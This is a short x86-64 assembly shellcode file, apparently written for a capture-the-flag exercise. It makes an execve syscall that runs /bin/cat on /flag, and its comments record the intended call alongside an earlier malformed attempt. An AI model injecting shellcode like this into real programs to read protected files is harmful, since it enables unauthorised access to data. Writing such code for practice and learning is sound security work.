        .intel_syntax noprefix
        .global _start
        .text

_start:
//      jmp skip

skip:
//      int 3
        mov     rax, 59
        lea     rdi, [rip+arg0]
        lea     rcx, [rip+arg1]
        push    rcx
        lea     rsi, [rsp]
        mov     rdx, 0
        xor rcx, rcx
        syscall
        pop rcx

arg0: .ascii "/bin/cat\0"
arg1: .ascii "/flag\0"
//  execve("/bin/cat", ["/bin/cat", "/flag"], NULL) = 0
//execve("/bin/cat", ["/bin/cat", 0x1, "./a.out"], NULL)
